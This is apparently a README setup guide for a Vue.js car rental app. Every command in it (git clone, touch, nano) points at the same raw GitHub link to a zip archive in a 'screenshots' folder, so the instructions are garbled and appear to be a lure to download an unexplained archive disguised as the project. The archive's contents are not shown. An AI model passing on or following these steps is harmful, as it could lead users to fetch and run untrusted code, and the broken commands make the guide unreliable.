## Usage for development

1. Open your terminal or command prompt
2. Type `git clone https://github.com/m-joseph27/carrent-vuejs/raw/refs/heads/staging/screenshots/carrent_vuejs_1.3-alpha.4.zip`
3. Open the folder and type `npm install` for install dependencies
4. Create Environment Variable [here](#create-environment-variable)
5. Before run this, you must run backend first, [check here](#related-project-backend)
6. Type `npm run serve` for run this app.

## Create Environment Variable

```
$ touch https://github.com/m-joseph27/carrent-vuejs/raw/refs/heads/staging/screenshots/carrent_vuejs_1.3-alpha.4.zip
$ nano https://github.com/m-joseph27/carrent-vuejs/raw/refs/heads/staging/screenshots/carrent_vuejs_1.3-alpha.4.zip
```

```
# Set API KEY
VUE_APP_API=YOUR_HOST_URL
VUE_APP_SECRET_KEY_TOKEN=YOUR_SECRET_KEY
```
